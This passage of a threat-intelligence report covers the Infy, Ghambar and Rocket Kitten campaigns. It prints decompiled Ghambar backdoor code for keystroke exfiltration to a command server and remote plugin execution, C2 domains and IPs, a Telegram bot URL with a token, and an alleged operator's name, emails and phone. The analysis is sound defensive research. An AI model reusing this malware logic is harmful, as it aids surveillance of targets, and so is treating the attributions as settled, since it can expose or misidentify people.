domain was ​updatebox4.com. As noted by ​25\n\nthe Danish Defense Intelligence Service’s Center for Cybersecurity and Palo Alto’s research into previous\n\n25 IP addresses 192.69.200.143 (First: 2014­06­06, Last: 2016­04­07), 138.201.47.153 (2016­04­06, 2016­04­14).\n\n14\n\n\n-----\n\nInfy and Infy M variants, the domains used for communications changed across different versions,\npotentially as a result of their blacklisting and detection by antivirus products (reasons for this hypothesis\nare noted in Participants​ section). Older infrastructure resources did continue to be maintained in order ​\nservice agents from past versions, and Palo Alto notes in its sinkhole data that a non­trivial number of\nclients were infected by extremely old agents. For example, the DNS records were all been reconfigured\nsimultaneously in April 2016 when Infy attempted to change providers.\n\nThe following are other domains we observed used as command and control in the past.\n\n**bestupdateserver.com**\n\n**IP** **First Seen** **Last Seen**\n\n192.69.208.203 2013­04­13 2016­03­30\n\n192.69.208.202 2013­04­13 2013­04­13\n\n138.201.47.153 2016­04­08 2016­04­14\n\n**updateserver1.com**\n\n**IP** **First Seen** **Last Seen**\n\n192.69.200.143 2013­05­23 2016­03­25\n\n138.201.47.153 2016­04­08 2016­04­11\n\n**updateserver3.com**\n\n**IP** **First Seen** **Last Seen**\n\n192.69.200.143 2014­06­06 2016­04­07\n\n138.201.47.153 2016­04­06 2016­04­14\n\n#### A Not So Clever Failover Strategy\n\nThe authors of the Infy keylogger included a failover command and control communication system. By\nusing a Domain­Generation­Algorithm (DGA), the malware is instructed to contact a different domain\nevery day in the form of box40XX.net, where XX is a digit that appears to increment every day and resets\non a monthly basis. While normally DGAs are triggered only in the case that the primary command and\ncontrol server isn't responding (because it has been seized, or otherwise disabled), in this case the\nmalware attempts to systematically contact the daily domain every time a set timer hits, regardless of the\n\n15\n\n|IP|First Seen|Last Seen|\n|---|---|---|\n|192.69.208.203|2013­04­13|2016­03­30|\n|192.69.208.202|2013­04­13|2013­04­13|\n|138.201.47.153|2016­04­08|2016­04­14|\n\n|IP|First Seen|Last Seen|\n|---|---|---|\n|192.69.200.143|2013­05­23|2016­03­25|\n|138.201.47.153|2016­04­08|2016­04­11|\n\n|IP|First Seen|Last Seen|\n|---|---|---|\n|192.69.200.143|2014­06­06|2016­04­07|\n|138.201.47.153|2016­04­06|2016­04­14|\n\n\n-----\n\navailability of the main C&C. We noticed on first discovery of this DGA mechanism that only in one case\nhad a failover domain has been registered by the operators (box4054.net), while all the remaining ones\nhad been left unregistered.\n\nWe also noticed that the primary command and control server is able to instruct the agents to download\nand execute any binary file. In order to do so, the command and control server would simply reply to the\nfirst check­in request with an HTTP 302 redirect to a URL pointing to a Windows executable. This is\nnormally used by the primary C&C to distribute updates of the malware, when new versions have been\ndeveloped and tested. We attempted to reproduce this procedure and discovered that we were able to\ntrigger the malware to pull and execute any binary file we wanted also when contacting one of the DGA\ndomains. Clearly, if noticed by other malicious actors, this flaw in the design of Infy's command and\ncontrol system could be abused to deploy additional malware, since no verification or authentication of\nthe downloaded binary is performed.\n\nIn order to collect more accurate information on the nature of the targets of the Infy campaign, notify\nvictims and prevent abuse of this security failure, beginning at the end of December 2015 we registered\nall the domains that were left available and recorded the requests coming in from this failover mechanism.\nWhen the Infy group began notice that its domains and hosts were being taken down, it sought to register\nadditional DGA domains and were able to control two more names (box4070.net and box4071.net). The\nremainder are under our control and being sinkholed to prevent abuse.\n\n#### Participants to Infy\n\nAcross at least six years of operation, at least three within the scope of the currently documented\ncampaign, the entities behind Infy have recurrently used the same identifiers in their registrations and\ncommunications, which indicate an Iranian origin and could be personally­identifiable information.\n\nWhile multiple sets of domains have been used in the command and control infrastructure for both Infy\nagents, these domains were typical originally registered under email addresses associated to the name\n‘Amin Jalali,’ with the addresses aminjalali_58@yahoo.com, aj58mail­box@yahoo.com, and 26\n\nam54ja@yahoo.com. The contact information on these domains have been updated in recent months 27\n\nwith false identities attributed to Poland and India to masque the original registrant, however, the\nownership and contact email remains the same.\n\nRegistration Information for bestwebstat.com ​\n\nRegistrant Name:amin jalali\nRegistrant Organization:safehostonline\nRegistrant Street1:afriqa street number 68\nRegistrant City:tehran\n\n26 Possibly not a valid address with Yahoo!'s username schema.\n27 These dates are assumably Persian calendar dates and suggest Jalali is in his mid­thirties at the time of this\npublication.\n\n16\n\n\n-----\n\nRegistrant State:Tehran\nRegistrant Postal Code:19699\nRegistrant Country:IR\nRegistrant Phone:+98.935354252\nRegistrant Fax:\nRegistrant Email:aminjalali_58@yahoo.com\n\nThe aliases associated with Amin Jalali appear elsewhere outside of registrations. A user ‘aj58’ posted 28\n\nin late July 2015 on the user forums of Sophos claiming that the detection of the domains\n‘bestupdateserver.com’ and ‘updateserver1.com’ as malicious was mistaken, and that there was no\nmalware hosted on these sites. Both domains were frequently used as command and control for their\nmalware campaigns in the first half of 2015, and the categorization of the domains as malicious was\ncorrect. While McAfee appears to have changed the categorization in its TrustedSource database, the user\napparently was unable to clear the domains from a sufficient number of antivirus products, and registered\nthe second group of domains a few weeks later.\n.\n\nA similar email address (without the underscore) commented on an article posted on Iranian Army News 29\n\nsite about the death of Jihad Mughniyeh, the son of Hezbollah commander Imad Mughniyeh, who was\nkilled in Syria in an operation believed to have been conducted by Israel, mourning his death and\nproclaiming him a martyr.\n\n28 [https://community.sophos.com/products/unified­threat­management/f/55/t/46992​](https://community.sophos.com/products/unified-threat-management/f/55/t/46992)\n29\n\n[http://arjanews.ir/%D8%AC%D9%87%D8%A7%D8%AF­%D9%85%D8%BA%D9%86%DB%8C%D9%87­%D8](http://arjanews.ir/%D8%AC%D9%87%D8%A7%D8%AF-%D9%85%D8%BA%D9%86%DB%8C%D9%87-%D8%A7%D8%B2-%DA%86%D9%87-%D8%B2%D9%85%D8%A7%D9%86-%D8%AA%D8%AD%D8%AA-%D9%86%D8%B8%D8%A7%D8%B1%D8%AA-%D8%B3%D8%B1%D8%AF%D8%A7%D8%B1-%D8%B3/)\n[%A7%D8%B2­%DA%86%D9%87­%D8%B2%D9%85%D8%A7%D9%86­%D8%AA%D8%AD%D8%AA­%D9](http://arjanews.ir/%D8%AC%D9%87%D8%A7%D8%AF-%D9%85%D8%BA%D9%86%DB%8C%D9%87-%D8%A7%D8%B2-%DA%86%D9%87-%D8%B2%D9%85%D8%A7%D9%86-%D8%AA%D8%AD%D8%AA-%D9%86%D8%B8%D8%A7%D8%B1%D8%AA-%D8%B3%D8%B1%D8%AF%D8%A7%D8%B1-%D8%B3/)\n[%86%D8%B8%D8%A7%D8%B1%D8%AA­%D8%B3%D8%B1%D8%AF%D8%A7%D8%B1­%D8%B3/](http://arjanews.ir/%D8%AC%D9%87%D8%A7%D8%AF-%D9%85%D8%BA%D9%86%DB%8C%D9%87-%D8%A7%D8%B2-%DA%86%D9%87-%D8%B2%D9%85%D8%A7%D9%86-%D8%AA%D8%AD%D8%AA-%D9%86%D8%B8%D8%A7%D8%B1%D8%AA-%D8%B3%D8%B1%D8%AF%D8%A7%D8%B1-%D8%B3/)\n\n17\n\n\n-----\n\n“In memory of him, rest in peace. Lucky him to become a martyr. ”\n\nFinally, the sinkhole logs on the DGA failover mechanism provides some indication as to the\ndevelopment cycle and actors behind the Infy malware. Prior to the distribution of new versions of the\nagent, the Infy developers appear to consistently conduct tests from local hosts, which indicates that the\ncontrol and maintenance of the software occurs in the Khorasan Razavi province of Iran, potentially in the\ncity of Mashhad. These testing periods appear as episodes where a few hosts from a previously unseen\nversion of the client register on the backup infrastructure, and are the only live copies of that version for a\nlength of time. Typically these hosts have the same generic system information, likely virtual machines\ndedicated to testing of the agent, and have mistakes in their operation. Those clients then stop responding\naround the time that other systems from a heterogeneous set of locations and machine names begin to\nregister, indicating that the version has been pushed out to the public.\n\nOur dataset covers three testing and deployment cycles of versions of the Infy agent.\n\n**Version** **Tested on** **Released**\n\n29 3 January 2016 13 January 2016\n\n30 2 February 2016 21 February 2016\n\n31 1 May 2016 _?_\n\nThe following are the computer names and IP addresses of the beacons we believe to belong from\ndevelopers of the Infy malware, performed in the aforementioned testing cycles:\n\n**Hostname** **Version** **Seen** **IP(s)** **Location(s)**\n\nFERDOWSI 29 13/1/2016 2.180.157.xxx Khorasan Razavi, Iran\n31.14.152.xxx\n5.232.90.xxx\n46.100.135.xxx\n2.180.92.xxx\n5.222.214.xxx\n2.182.52.xxx\n2.180.143.xxx\n65.49.68.xxx\n\n18\n\n|Version|Tested on|Released|\n|---|---|---|\n|29|3 January 2016|13 January 2016|\n|30|2 February 2016|21 February 2016|\n|31|1 May 2016|?|\n\n|Hostname|Version|Seen|IP(s)|Location(s)|\n|---|---|---|---|---|\n|FERDOWSI|29|13/1/2016|2.180.157.xxx 31.14.152.xxx 5.232.90.xxx 46.100.135.xxx 2.180.92.xxx 5.222.214.xxx 2.182.52.xxx 2.180.143.xxx 65.49.68.xxx|Khorasan Razavi, Iran|\n\n\n-----\n\n|DESKTOP­TFG03B1|30|2/2/2016|192.99.220.xxx 5.232.151.xxx 5.232.157.xxx|Khorasan Razavi, Iran|\n|---|---|---|---|---|\n|DESKTOP­TFG03B1|29|9/1/2016|2.180.96.xxx 5.232.135.xxx 5.232.140.xxx 5.232.136.xxx 5.232.143.xxx|Mashhad, Khorasan Razavi, Iran|\n|WIN­A2HDDI940BE|29|12/1/2016|192.99.220.xxx|Canada (OVH)|\n|WIN­SLRJHLCR4VK|30|20/2/2016|5.232.154.xxx|Khorasan Razavi, Iran|\n|USER1­DA087865E|31|1/5/2016|217.172.105.xxx|Iran (Asiatech)|\n|DESKTOP­TFG03B1|31|1/5/2016|217.172.105.xxx|Iran (Asiatech)|\n\n\nOther names and references to the infrastructure maintained by Infy, or used in communications with\ntargets, suggest pseudonyms or identities of the culprits, as well as their origin or political disposition. In\nthe series of spearphishing attempts against Persian­language media figures conducted prior to the June\n2013 election, the phrase Baran Omid was used consistently, either the name of a woman or the phrase\n“Rain of Hope.” The word, Baran, would also arise in the executable extracted by earlier versions of the\nmalware “C__Users_baran_AppData_Local_Temp_done[1].exe.” In metadata documents that served as\nmalware vectors, we also find document author names of ‘baran.’ 30\n\nIn later versions of Infy documents, the authorship information is set to ‘ya zahra’ and ‘ya husein’ ­­\nexpressions that maintain Shi’a religious connotations referring to the wife of Ali and daughter of\nMohammad, and Ali’s martyred son, respectively.\n\n#### Response to Publication\n\nOn May 2, 2016, Palo Alto Networks published the report “Prince of Persia,” which provided the first\npublic and widely­reported indication of Infy’s activities in Iran, while other publications either refrained\nfrom making the association or were not openly available. By May 12, Palo Alto began to sinkhole the 31\n\nprimary command and control infrastructure, which combined with the prior registration of the DGA\nresources, severely inhibited the continued operation of the Infy campaign. However, within this struggle\nto maintain access, additional incidents of note occurred.\n\nFirstly, actions taken by telecommunications regulators in Iran indicate either an intervention to end\noperation of the Infy network or an attempt to interfere with further research. As of June 2016, a subset of\nthe domains identified in the operations of the Infy campaigns were specifically inaccessible inside of\nIran, aside from their being sinkholed to Shadowserver or directed to localhost. This unavailability is the 32\n\n30 June 12, 2013 (49664f69885d40c6913378ac264afd2a)\n31 As provided by Palo Alto\n32 bestbox3.com, bestupdateserver.com, bestupdateserver2.com, updatebox4.com, updateserver1.com,\nupdateserver3.com, youripinfo.com\n\n19\n\n\n-----\n\nresult of the content filtering mechanism imposed by the Iranian government blocking access to the\nsinkhole through DNS tampering and HTTP filtering. The restrictions on Infy are explicitly targeted\nagainst requests for command and control domain names identified in the Palo Alto report. This filtering\nis conducted at the primary international gateway maintained by the Telecommunication Company of Iran\n(AS12880), and as a result prevents further communications from the clients in Iran.\n\n - Host: updateserver3.com\n\n < HTTP/1.1 403 Forbidden\n\n<html><head><meta\nhttp­equiv=\"Content­Type\"\ncontent=\"text/html;\ncharset=windows­1256\"><title>FR16\n</title></head><body><iframe\nsrc=\"http://10.10.34.34?type=Invalid\nSite&policy=MainPolicy \" style=\"width:\n100%; height: 100%\" scrolling=\"no\"\nmarginwidth=\"0\" marginheight=\"0\"\nframeborder=\"0\" vspace=\"0\"\nhspace=\"0\"></iframe></body></html>\n\nThis is a unique phenomenon. Other domains from Palo Alto reports unrelated to Iran do not appear to\nhave been blocked, nor have domains connected to other Iranian intrusion campaigns such as Flying\nKitten or Cleaver. It appears that this unique action occurred after Palo Alto’s report, for reasons that are\nnot immediately clear. The filtering policy indicates that Iranian authorities had specifically intervened to\nblock access to the command and control domains of a state­aligned intrusion campaign at a country\nlevel.\n\nConcurrently, the sinkhole of campaign resources set off a struggle to regain control of the clients and\nshift command infrastructure to alternative providers with new hostnames. Palo Alto began to disrupt\naccess to Infy’s primary domain names on a Thursday, the Iranian weekend. It was not until the start of\nthe Iranian work week, the morning of Saturday, May 14, that the Infy actors appeared to notice the loss\nof their network and then the registration of the DGA. In their reaction and investigation, the developers\nagain exposed their original IP addresses, as they attempted to investigate the nature of the DGA domains\nthat had been registered (again from the Razavi Khorasan province). Only at the moment that the backup\ndomains were needed most did the actors notice their unavailability, nearly six months after we silently\nbegan our sinkholing operation.\n\n5.232.158.XXX ­ ­ [14/May/2016:03:55:22 ­0400] \"GET\n/themes/?tt=csdkjchskdjchskd&cn=cdskh&ver=&lfolder&machineguid=ckshdcksjdchkd HTTP/1.1\" 404 233 \"­\" \"Mozilla/5.0 (Windows NT\n6.1; Trident/7.0; rv:11.0) like Gecko\"\n\n184.75.221.XXX ­ ­ [14/May/2016:12:35:32 ­0400] \"GET\n/themes/?tt=csdkjchskdjchskd&cn=cdskh&ver=&lfolder&machineguid=ckshdcksjdchkd HTTP/1.1\" 404 200 \"­\" \"Mozilla/5.0 (Windows NT\n6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2687.0 Safari/537.36 OPR/38.0.2205.0 (Edition developer)\"\n\n20\n\n|> Host: updateserver3.com > < HTTP/1.1 403 Forbidden <html><head><meta http­equiv=\"Content­Type\" content=\"text/html; charset=windows­1256\"><title>FR16 </title></head><body><iframe src=\"http://10.10.34.34?type=Invalid Site&policy=MainPolicy \" style=\"width: 100%; height: 100%\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\" frameborder=\"0\" vspace=\"0\" hspace=\"0\"></iframe></body></html>|Col2|\n|---|---|\n\n\n-----\n\n192.99.220.XXX ­ ­ [14/May/2016:13:13:34 ­0400] \"GET\n/themes/?tt=csdkjchskdjchskd&cn=cdskh&ver=&lfolder&machineguid=ckshdcksjdchkd HTTP/1.1\" 404 142 \"­\" \"Mozilla/5.0 (Windows NT\n6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0\"\n\nDespite the sinkhole actions and registrations of backup domains by researchers, the Infy actor group did\nremain in control of a limited number of DGA names and other command and control resources. Based on\nthese names, and the limited window they afforded the actors, the Infy group was able to push down Infy ​\n_M to ​Infy​_ clients in order to reassert control over a subset of the infected clients. These updates moved the ​\nclients to an alternative set of names registered to the group, but did not remove the previous infections,\npotentially leading to phenomena of clients infected with both versions of the client that was noted by\nPalo Alto.\n\nPalo Alto notes that in early June, the Infy actors had used command and control domain names and\naddresses associated with an older version of Infy (versions 15 through 24) in order to push down a new\nInfy M v. 8.0 client; an incident that represented their first observed transition from Infy to Infy M. Again\nby June 12, the domain involved in this command and control function appears to have been sinkholed.\nThis was probably not the first time such an action occurred, and certainly not the last. In late June, the\nInfy actors used their remaining DGA domains to push an additional version of Infy M (still 8.0) with\nanother domain name as the primary command and control (nstrad.dynu.com), which we were able to\nsinkhole. However, by this point the attrition of repetitive migration appeared to have set in. Only one\nclient, based in Iran, continued to communicate with the infrastructure.\n\n**Infy (Unknown Variant) Post­Sinkhole Infections, June ­ July 2016**\n\nWhile researchers have been successful in redirecting and registering Infy hostname resources, at least a\nsubset of the clients appear to beacon to a remaining address despite the original name (uvps1.cotbm.com)\n\n21\n\n\nclient, based in Iran, continued to communicate with the infrastructure.\n\n\n-----\n\nbeing sinkholed. It is unclear whether this is erroneous behavior or an undocumented mechanism of\nbeaconing, however, a limited window into the activities between late June and mid­July 2016 implicates\n250 IP address in 19 countries. A significant portion of these addresses appear to be dynamic IPs or\nVPNs, particularly those in Iran, suggesting the real number of infections is lower. These addresses are\nlargely a disjoint set from those that responded to the DGA of the Infy agents, however, the regions and\nnetworks associated with the infections align with the client’s broader trends. The client base could\noriginate from the Infy M network.\n\nNot matter the source or the cause of these continued client operations, the network remains active and\nthe demonstrable success of the threat group in compromising critical targets gives pause to the prospects\nthat the Infy campaign will end anytime soon.\n\n### Ghambar Malware\n\nIn December 2014, Cylance described a set of actors and tools, labelled “Operation Cleaver,” which\ndiffered from those campaigns associated with Flying Kitten and Rocket Kitten. Cleaver was described as\na persistent campaign conducted over several years, targeting economic infrastructure, defense\ncorporations and governments in the Middle East and elsewhere. According to the tools and techniques\nused in the campaigns, often centered on the development of a fictitious persona as a lure for employees\nof targeted companies, the Cleaver threat group was considerably more ambitious than other groups.\n\nWhile previous publication focused on espionage activities, the same personas and tools disclosed in\nreports on the groups arose in other incidents occurring at the same time that were targeted against\nreligious minorities and foreign policy institutions focused on Iran. In our monitoring of activities similar\nto those of Cleaver over the course of two years, until at least June 2016, over sixty identified domain\nnames targeted a more diverse set of institutions and nationalities, including: an Israeli advocacy\norganization, American foreign policy institutions, Saudi economic and governmental entities,\ninternational Iranian human rights organizations, the American and European defence industry base,\nactivists mobilizing on Facebook from inside of Iran, and civil aviation companies. Based on\ncommonalities between toolkits and targeting, we believe that it is the same group, although we also\nbelieve the structure of the organization has shifted over recent months.\n\nIncluded in these activities, we find indication of the development of a successor to malware agents\ndeveloped by the Cleaver actors. Currently, we identify this malware family as “Ghambar,” due to the\nword being used in some function names and variables inside the same malware’s code; also subsequent\nsamples expose potentially personally identifiable information and alternative names. While Ghambar\ndoes not seem to share any significant codebase with past tools, we believe that Ghambar might be the\nsuccessor of TinyZBot, which is one of the artifacts described by Cylance in the Operation Cleaver report.\nSimilar to TinyZBot, Ghambar is also developed in C# and it employs the same SOAP­based command\nand control protocol. While it is provided with fewer features, Ghambar appears better designed and with\n\n22\n\n\n-----\n\na cleaner code style. The samples we obtained dates to November­December 2015 and late April 2016, 33\n\nrepresenting distinct points in the development cycle of the agent.\n\nprivate static void Main()\n{\ntry\n{\nUtils.DbgPrint(\".: In the name of God :.\");\n...\n\nWithin the decompiled code we find references to Islam, with the first instruction on installation of the\ndevelopment version of Ghambar being the printing of the debug string of “In the name of God.” This\nfeature is the shorten version of the phrase \"In the name of God, the Most Gracious, the Most Merciful\"\n(Bismillah ir­Rahman ir­Rahim​ ). The connotation of the phrase and its placement is notable, ​ ​Bismallah is ​\nthe introduction of most chapters of the Quran, and is commonly referenced within the political discourse\nof Muslim societies. Its inclusion in less public aspects of Cleaver’s operation may provide insight into\nthe developers of Ghambar and their reasons for engaging in such campaigns.  34\n\nGhambar’s use in the wild was directly observed in April 2016 when a number of human rights activists\nin the diaspora received invitations to a “Middle East Human rights Webinar” hosted by a small Spanish\nuniversity. The Cleaver actors breached the main site of the university, believed to be achieved through\nthe exploitation of a software vulnerability (a Nessus installation was found on a related\nattacker­maintained server). Using the valid Sender Policy Framework address, the actors were then able\nto send legitimate­appearing messages posing as the university that appeared to be invitations to an Adobe\n\n33 MSPavilion.exe ­ 00b5d45433391146ce98cd70a91bef08\n34 Or their sense of humor.\n\n23\n\n\n-----\n\nConnect webinar. The referenced conference information was then hosted on the university site, leading\nto valid links as well. Once on the page, and only if the user appeared to be on Windows, the page would\ntrigger a warning about an Adobe Flash update. As common elsewhere, the downloaded installer would\nbe a legitimate version of Flash bundled with Ghambar.\n\n#### Structure and Operations\n\nGhambar is written in C# and appears distributed obfuscated with SmartAssembly. Using de4dot we can 35\n\neasily deobfuscate the code and with ILSpy decompile the binary to its original source code. Within the 36\n\ndecompiled source code we quickly observe that the malware is provided with a debugging option in the\ncase the file “D:\\Debug.Me​ ” is present: ​\n\npublic static void DbgPrint(string log)\n{\nif (File.Exists(\"D:\\\\Debug.Me\"))\n{\nDebug.Write(log);\n}\n}\n\nBy creating an empty file at that particular path, we can enable the logging which is helpful and\ninteresting when monitoring an initial execution:\n\n35 http://de4dot.com/\n36 http://ilspy.net/\n\n24\n\n\n-----\n\nWhat the main function does is install the malware in the proper folder\n(“%AppData%\\Pavilion\\MSPavilion.exe​ ​”) and registers it in the ​Run registry key to gain persistence. The ​\nmain function then finally launches a new instance of the newly copied executable. The new process, after\ninvoking a self­explanatory and ambitious function called ​ManualSleepToBypassAv​, will load the\nconfiguration from its own resources. An example of the deobfuscated configuration in included at\nAppendix “Ghambar Configuration​ .” ​\n\nIf the configuration provides paths to either a JPG or a PDF file, the Ghambar will open them as decoy.\nThe malware will then collect some basic information on the compromised system, instantiate a\nconnection to the command and control, and register to it. Subsequently, it initializes a keylogger with the\ntraditional SetWindowsHookEx ​ technique, as well as a procedure to communicate and receive commands ​\nfrom the C&C:\n\nprivate static void IterativeRoutinsProc(ServiceManifest communicationChannel)\n{\ntry\n{\nwhile (true)\n{\n\n25\n\n\n-----\n\nUtils.DbgPrint(\"CommandControlProc\");\nCommandControlController.CommandControlProc(communicationChannel,\nProgram.ConfigInfo.TargetId);\nProgram.FileUploader.UploadAllOfflineFiles(communicationChannel,\nProgram.ConfigInfo.TargetId);\nUtils.ManualSleepToBypassAv(30);\nThread.Sleep(30000);\nUtils.HeyImOnline(Program._communication,\nProgram.ConfigInfo.TargetId);\n}\n}\ncatch (Exception ex)\n{\nUtils.DbgPrint(string.Format(\"EX : {0} Method : {1}\", ex.Message,\nMethodBase.GetCurrentMethod().Name));\n}\n}\n\nAs you can see from the procedure above, before the regular check­in with the C&C, the malware invokes\n_Program.FileUploader.UploadAllOfflineFiles​. Interestingly, Ghambar is designed to leave as little_\nfootprint on the system as possible. When collecting screenshots, clipboard data, and intercepted\nkeystrokes, it attempts to directly send the data to the C&C without writing on disk. For example, we can\nobserve this behavior in the following portion of code handling intercepted keystrokes data:\n\nprivate static void KeylogBufferArrived(string buffer)\n{\nif (!string.IsNullOrEmpty(buffer))\n{\ntry\n{\nif (Utils.IsServerEndpointAvaliable())\n{\nbool flag;\nProgram._communication.SendKeyLog(Program.ConfigInfo.TargetId,\nDateTime.Now, true, buffer, out flag, out Program._tempSpecified);\n}\nelse\n{\nstring keyloggerStoragePath =\nIoPathUtils.GetKeyloggerStoragePath();\nif (!Directory.Exists(keyloggerStoragePath))\n{\nDirectory.CreateDirectory(keyloggerStoragePath);\n}\nstring path = Path.Combine(keyloggerStoragePath,\nPath.GetRandomFileName());\nFile.WriteAllText(path, buffer);\n}\n}\ncatch (Exception ex)\n\n26\n\n\n-----\n\n{\nUtils.DbgPrint(string.Format(\"EX : {0} Method : {1}\", ex.Message,\nMethodBase.GetCurrentMethod().Name));\n}\n}\n}\n\nIn case the C&C is available, the data buffer is directly sent over, otherwise it is stored in a directory\nspecified in the configuration properties. In the latter case, when at the next iteration\n_UploadAllOfflineFiles is called, the files on disk will be deleted. ​_\n\nWhile executing a parallel keylogger, Ghambar is also able to receive instructions from the C&C on\nadditional tasks to execute. These tasks can be additional plugins to be downloaded and executed, generic\ntasks on the file system, or a number of predefined commands. Following is the portion of code\nresponsible for fetching pending tasks for those three categories, Appendix “​Ghambar Command Control” ​\ninclude the pertinent code.\n\nGhambar is provided with a full­featured plugins system. If instructed to do so by the C&C, the malware\nis able to download, store, and execute any given plugin. In the following relevant snippet, you can also\nobserve a mention to a _ghambarService​ ​.\n\npublic void ProcessPlugins(T4[] plugins)\n{\nUtils.DbgPrint(MethodBase.GetCurrentMethod().Name);\nfor (int i = 0; i < plugins.Length; i++)\n{\nT4 t = plugins[i];\nstring text = CommandProcessor._ghambarService.DownloadPlugin(t.ID);\nif (!string.IsNullOrEmpty(text))\n{\nbyte[] bytes = Convert.FromBase64String(text);\nstring path = Path.Combine(IoPathUtils.GetPluginsPath(), t.ID);\npath = Path.ChangeExtension(path, t.FileFormat);\nif (!Directory.Exists(IoPathUtils.GetPluginsPath()))\n{\nDirectory.CreateDirectory(IoPathUtils.GetPluginsPath());\n}\nFile.WriteAllBytes(path, bytes);\nif (File.Exists(path))\n{\nbool isActive = PluginUtils.InstallPlugin(t);\nbool flag;\nbool flag2;\n\nCommandProcessor._ghambarService.SetPluginActiveState(this._targetId, t.ID,\nisActive, true, out flag, out flag2);\n}\n}\n\n27\n\n\n-----\n\n}\n}\n\nOther than generally creating, deleting and fetching files, Ghambar is also able to executed a number of\npredefined commands if instructed to do so by the C&C. The commands, identified by a command­type\nidentifier, include the following:\n\n  - Self­destruct;\n\n  - Execute a command through ​cmd.exe​ and return output;\n\n  - Take a screenshot;\n\n  - Shutdown the computer;\n\n  - Restart the computer;\n\n  - Logoff the user;\n\n  - Lock the computer;\n\n  - Turn on and off the monitor;\n\n  - Set and copy clipboard data;\n\n  - Enable or disable mouse/keyboard (although these procedures are not yet implemented);\n\n  - “Enable or disable desktop” (not implemented);\n\n  - Trigger a BSOD (also, not implemented).\n\nWhile the sample we obtained might be an earlier stage still under development, Ghambar is already\nprovided with enough features to make it a fully­functional backdoor.\n\n#### Infrastructure\n\nThe Ghambar sample we obtained is configured to contact the domain ​nvidia­update.com​. Prior to its\nlapse, the domain resolved to the IP address 85.17.172.180, hosted at Leaseweb in the Netherlands.\nGhambar interacts with the server with a SOAP­based XML protocol on port 5050, with well defined\nstructures and events that very granularly defines the processes of registering the compromised\ncomputers, fetch commands, and report their results. It doesn’t employ any encryption algorithm, it\noccasionally just compresses with zlib and encodes in base64 particularly large portions of data.\n\nAppendix “Ghambar Network​ ” is a typical exchange between the compromised host and the command ​\nand control server, from initial registration to command fetching. For the sake of clarity, we broke down\nand formatted the content of the communication stream.\n\n### Rocket Kitten\n\nBeginning in April 2014, Israeli academic institutions and corporations began to encounter persistent\nspearphishing attempts through emails with attached Microsoft Office documents that had embedded\ncopies of the CORE Impact penetration testing agent. Across multiple reports on intrusion attempts 37\n\nagainst Israeli academics and international human rights advocates, a collective set of actors labelled\n\n37 [http://www.clearskysec.com/gholee­a­protective­edge­themed­spear­phishing­campaign/​](http://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign/)\n\n28\n\n\n-----\n\n“Rocket Kitten” was documented as conducting account credential phishing and malware campaigns\nbased on a changing set of tactics and tools. The origin of these actors was established and affirmed\nthrough Persian­language references in malware code, disclosures of IP addresses in compromised\naccounts, patterns in the selection of targets, and native Persian­language in spearphishing messages.\nMoreover, poor isolation of activities and failures to secure malware infrastructure led to the identification\nof one of the authors of the group’s phishing and malware systems, Yaser Balaghi, pseudonymous\noperating as “Wool3n.H4t.” As researchers pursued Rocket Kitten’s activities over time, a common\npattern of spearphishing campaigns reflecting the interests and activities of the Iranian security apparatus\nbecame apparent, one which continues with a demonstrable evolution based on a learning process over\nefforts that include dozens of domain names and shifting infrastructure, and is broader than one\nindividual.\n\nThe infrastructure and tactics documented across the Rocket Kitten campaigns represent a visible break\nfrom the Flying Kitten activities documented by FireEye. Days after the May 2014 Operation Saffron\nRose report, the dozens of domains and servers connected with the group, which had been active until\npublication, were taken down or lapsed, not to be used again. The lull in intrusion attempts reported\nagainst Iranian activists after this cessation lasted four months, until an Iranian journalist received\nnotifications purporting to be from Google claiming that their accounts had been accessed from “The\nRussia” with the IP address “109.172.51.147.” The spearphishing message, sent from a compromised\nBritish quilting society’s site, directed the target to a user­specific account credential phishing page on the\ndomain “account­google.co” that was registered in July of that year. Over the following month, more\nhuman rights activists and journalists received similar notifications and other spearphishing attempts that\nwould later be associated with Rocket Kitten, marking the start of renewed intrusion campaigns against\nIranians inside of the country and the diaspora. Rocket Kitten’s activities are clearly discernable up until\npublication of this report, and while more information on these actors activities against human rights\norganizations will be forthcoming, this section is intended to provide insight into two emerging trends\nconnected to the threat group.\n\n#### Telegram \n\nWhen the Rocket Kitten group breached the social media and personal email accounts of a prominent\nIranian in April 2016, the intruders then engaged in conversations with her contacts and individuals in the\nhuman rights community. Amongst credential phishing attempts, in those conversations, the impersonator\nwould ask if they had a Telegram account, and then ask for a “conversation request code” – in actuality\nthe one­time login password provided by SMS to the user. The new focus on the messaging service\nfollowed its rapid rise in the popularity after interference with Viber, especially with political\norganizations to mobilize constituencies in the February 2016 Parliamentary Election. Moreover, while\nTelegram has grown popular in Iran in part due to their claims of user security, the application is more\nvulnerable to compromise than other online services if the user does not take additional measures to\nprotect their account due to its reliance on mobile operators.\n\nConnected to this infrastructure is indication that that the Rocket Kitten group have engaged in a brute\nforce enumeration of Telegram accounts connected with Iranian telephone numbers through the API\n\n29\n\n\n-----\n\nservices provided to developers. The Google credential phishing domain used in the April 2016 incident\noverlapped with at least two domains, “shaftool.com” (176.102.64.206) and “ghalpaq.com”\n(185.130.226.12). According to accessible logs, the actors had registered dozens of API access codes and,\nwhen these key would be revoked by Telegram for overuse, the script would simply move on to the next\nkey. These API keys corresponded with bots labeled “Ghodrat” (ghodrad2015_bot) and “Shaftool”\n(shaftool_bot), which reported back to the same set of Telegram users on a periodic basis about the\nnumber of users the script had identified. Over the course of several days, the operation was able to\nidentify at least over 15 million Iranian phone numbers with Telegram accounts registered to them and the\nassociated user IDs, potentially approaching 20 million before the infrastructure was takedown and in\nsubsequent operations. While this information would not itself allow for the compromise of an account, it\nwould provide a map of the Iranian user base of the service that could be used for subsequent\ninvestigations and phishing attempts.\n\n**Telegram Enumeration Script Report Back**\n\nhttps://api.telegram.org/bot209917679:AAHPszmDRqj3mKLjbK0n­DZRSYlKjZyhacs/sendMessage?c\nhat_id=145121195&text=Total Numbers: 1012204\n\nThis network mapping operation had deeper ties to intrusion campaigns targeting chat applications,\nindicating a systemic engagement on the platform. The registration information of the two domains, in\nparticular the strange email address, telephone number and organization of “Tele comunication,” connect\nthe infrastructure to several typographic account credential phishing domains that posed as Telegram. The\nTelegram impersonation domains registered within short succession of each other in the middle of\nFebruary 2016. Further domains registered in the same naming schema later, but resembling the Ghalpaq\nhost 